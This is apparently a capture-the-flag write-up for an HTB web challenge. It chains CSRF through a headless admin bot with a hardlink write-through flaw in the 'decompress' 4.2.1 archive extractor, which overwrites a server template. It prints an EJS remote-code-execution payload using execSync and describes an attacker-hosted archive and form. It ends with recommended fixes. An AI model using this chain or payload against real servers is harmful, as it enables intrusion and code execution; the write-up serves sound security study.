# Archonyx — HTB Cyber Apocalypse 2026 (web)

**TL;DR:** Unauthenticated CSRF drives the puppeteer "warden" bot to hit an
authenticated `POST /api/fetch`. That endpoint pipes the fetched archive through
`download@8` → `decompress@4.2.1`, whose extractor blocks `..` and symlinks but
**not hardlinks**. A tar with a `link` entry followed by a `file` entry of the
same name writes *through* the hardlink to an arbitrary `ctf`-owned file, so we
overwrite `views/enter.ejs`. The unauthenticated `GET /enter` then renders our
EJS → RCE → `/readflag` → flag.

---

## Recon

Express 5 app. Key surface:

- Two extraction paths, both require a **verified** caller (`resolveAuth`):
  - `POST /api/manifest` → `unzipper.Extract` into `uploads/workspace/<user>` (known path).
  - `POST /api/fetch` → `download(url, uploads/imports/<drawsId>, {extract:true})`
    → `decompress` (random dir).
- Only two verified users exist: `admin` (ledgermaster) and `bot` (warden).
  Registered brokers stay `verified:false` forever (only an admin can clear them),
  so a normal attacker can never authenticate directly.
- `POST /report` (unauth) → `bot.visit(url)`: a headless Chromium with the bot's
  JWT cookie visits any URL we supply.
- Strict CSP on every app response: `script-src 'nonce-…'` (no `unsafe-inline`,
  no `'self'`) + `default-src 'self'`. Client-side XSS is effectively dead — no
  script exec and no external exfil channel (verified: injected `onerror` is
  blocked by CSP in the real bot).

### Consequences

- The **only** authenticated foothold is the bot, and the bot's Chromium is
  launched with `--disable-features=SameSiteByDefaultCookies,…`, so its cookie is
  sent on **cross-site requests** → classic **CSRF** works.
- We can't read the bot's responses (no CORS, CSP kills XSS), so the exploit must
  be a pure **side effect** that we can observe unauthenticated.

## The bug: hardlink write-through in `decompress` 4.2.1

`decompress`'s extractor protects against directory traversal and symlink
escapes:

- `safeMakeDir` refuses to create dirs outside the output (via `realpath`).
- `preventWritingThroughSymlink` refuses to write when the destination is a
  **symlink**.
- `realpath(dirname(dest))` must be inside the output dir.

But the **hardlink** branch is unguarded:

```js
if (x.type === 'link') return fsP.link(x.linkname, dest);   // x.linkname arbitrary!
...
return fsP.writeFile(dest, x.data, {mode});
```

`preventWritingThroughSymlink` only runs for `x.type === 'file'` and only checks
`readlink(dest)` — a hardlink is not a symlink, so the check passes. So:

1. A `link` entry named `pwn` with `linkname = /app/views/enter.ejs` creates a
   hardlink `imports/<id>/pwn` sharing the inode of `enter.ejs`.
2. A `file` entry, also named `pwn`, causes `writeFile(dest=pwn, data)` — which
   writes **through the hardlink to the shared inode**, overwriting `enter.ejs`.

`decompress` processes the entries in array order, so this is deterministic
(verified 6/6 locally). `/app` is owned by `ctf` (Dockerfile `chown -R ctf`), so
the write succeeds. The post-extraction `validateExtractedFiles` only unlinks the
`pwn` hardlink in the imports dir — the overwritten `enter.ejs` persists.

## Exploit chain

1. `POST /report` (unauth) with `url = http://ATTACKER/attacker.html`.
2. Bot loads `attacker.html`, which auto-submits a cross-site `x-www-form-urlencoded`
   `<form>` to `POST /api/fetch` with `url=http://ATTACKER/pwn.tar.gz`. Form POST
   → no CORS preflight; bot cookie sent (SameSite disabled) → authenticated as
   the verified bot.
3. Server downloads `pwn.tar.gz`; `decompress` hardlink write-through overwrites
   `/app/views/enter.ejs` with:
   ```ejs
   <% var cp=process.mainModule.require("child_process");
      var out=cp.execSync("(/readflag || cat /flag.txt) 2>&1").toString(); %>PWNSTART<%= out %>PWNEND
   ```
   (`require` isn't in EJS scope → use `process.mainModule.require`.)
4. `GET /enter` (unauth) renders the poisoned template → RCE as `ctf` → runs the
   setuid-root `/readflag` → flag in the response body.

## Run

```bash
# PUBLIC must be reachable BY THE REMOTE bot (VPS / tunnel)
./exploit.py http://TARGET:PORT http://YOUR_PUBLIC_HOST:8000
```

Local test result: `HTB{f4k3_fl4g_f0r_t3st1ng_0nly}` (placeholder flag shipped in
the handout; the remote uses `/readflag`).

## Fixes

- Upgrade/patch `decompress` to reject hardlink entries (or extract with
  `--no-same-owner`-style hardlink denial); validate entry types.
- Don't extract untrusted archives with `download({extract:true})`.
- Set `SameSite=Strict/Lax` cookies (and don't disable SameSite in the bot) +
  CSRF tokens on state-changing endpoints.
- Never render templates from a writable location; keep views read-only.
